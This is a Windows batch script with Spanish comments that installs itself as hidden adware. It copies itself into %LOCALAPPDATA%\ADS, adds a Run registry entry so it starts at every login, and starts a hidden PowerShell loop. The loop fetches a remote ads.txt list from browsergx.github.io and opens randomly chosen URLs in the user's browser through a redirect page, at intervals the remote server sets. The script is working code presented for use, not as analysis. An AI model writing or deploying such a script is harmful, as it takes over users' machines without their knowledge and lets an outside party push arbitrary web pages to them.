@echo off
REM Oculta los comandos en consola mientras se ejecuta el archivo por lotes.

REM Define la carpeta de destino en el perfil local del usuario (%LOCALAPPDATA%\ADS).
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"

REM Define la ruta completa del archivo .bat que vivira dentro de %LOCALAPPDATA%\ADS.
set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"

REM Define la ruta del Registro de Windows para iniciar aplicaciones al arrancar sesion.
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

REM Define el nombre de la entrada que se guardara en el Registro.
set "REG_NAME=RotadorAdsPS"

REM Si el primer argumento pasado al .bat es --uninstall (sin importar mayusculas/minusculas):
if /i "%~1"=="--uninstall" (
    REM Elimina la entrada del Registro para que no vuelva a iniciar con Windows.
    reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1

    REM Busca procesos powershell.exe que contengan RotadorAdsMutex y los cierra a la fuerza.
    powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*RotadorAdsMutex*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1

    REM Borra de forma recursiva y silenciosa la carpeta %LOCALAPPDATA%\ADS.
    rmdir /s /q "%CARPETA_ADS%" >nul 2>&1

    REM Sale del script tras completar la desinstalacion.
    exit
)

REM Define el bucle principal en PowerShell (sin usar # en linea para no cortar el comando):
REM 1) Crea un Mutex global para evitar que corran dos instancias del bucle a la vez; si ya existe, sale.
REM 2) En cada vuelta: espera por defecto 3600s, descarga ads.txt con parametro anti-cache y timeout de 15s.
REM 3) Lee 'activo' (0 o 1) e 'interval' (segundos >= 10) si estan presentes en ads.txt.
REM 4) Si esta activo, filtra las URLs http/https, elige una al azar, la codifica y abre go.html?url=... en el navegador predeterminado.
REM 5) Ignora errores de red/parseo con try/catch y duerme $espera segundos antes de repetir.
set "PS_LOOP=$created = $false; $mutex = New-Object System.Threading.Mutex($true, 'Global\RotadorAdsMutex', [ref]$created); if (-not $created) { exit }; while ($true) { $espera = 3600; try { $nocache = 'https://browsergx.github.io/ads/ads.txt?t=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $resp = Invoke-WebRequest -Uri $nocache -UseBasicParsing -TimeoutSec 15; $lineas = $resp.Content -split \"`r?`n\"; $actLine = $lineas | Where-Object { $_ -match '^\s*activo\s*=\s*[01]\s*$' } | Select-Object -First 1; $activo = $true; if ($actLine) { $activo = (([int]($actLine -split '=')[1].Trim()) -eq 1) }; $intLine = $lineas | Where-Object { $_ -match '^\s*interval\s*=\s*\d+\s*$' } | Select-Object -First 1; if ($intLine) { $val = [int]($intLine -split '=')[1].Trim(); if ($val -ge 10) { $espera = $val } }; if ($activo) { $urls = @($lineas | ForEach-Object { $_.Trim() } | Where-Object { $_ -match '^https?://' }); if ($urls.Count -gt 0) { $elegida = Get-Random -InputObject $urls; if (-not [string]::IsNullOrWhiteSpace($elegida)) { $encoded = [uri]::EscapeDataString($elegida); $destino = 'https://browsergx.github.io/ads/go.html?url=' + $encoded; Start-Process -FilePath $destino } } } } catch {}; Start-Sleep -Seconds $espera }"

REM Si rotador_ads.bat aun no existe en %LOCALAPPDATA%\ADS:
if not exist "%BAT_DESTINO%" (
    REM Crea la carpeta %LOCALAPPDATA%\ADS si no existe.
    if not exist "%CARPETA_ADS%" (
        mkdir "%CARPETA_ADS%" >nul 2>&1
    )
    REM Copia este mismo archivo .bat hacia la ruta de destino.
    copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

REM Consulta si ya existe el valor RotadorAdsPS en el Registro; si no existe (%errorlevel% distinto de 0), lo crea.
reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden\"" /f >nul
)

REM Si el script se ejecuto desde fuera de %LOCALAPPDATA%\ADS, lanza la copia de destino oculta y cierra este proceso.
if /i not "%~f0"=="%BAT_DESTINO%" (
    start "" /min powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden"
    exit
)

REM Ejecuta el bucle de PowerShell de forma oculta (-WindowStyle Hidden) sin cargar perfil (-NoProfile).
powershell.exe -NoProfile -WindowStyle Hidden -Command "%PS_LOOP%"

REM Finaliza el proceso .bat.
exit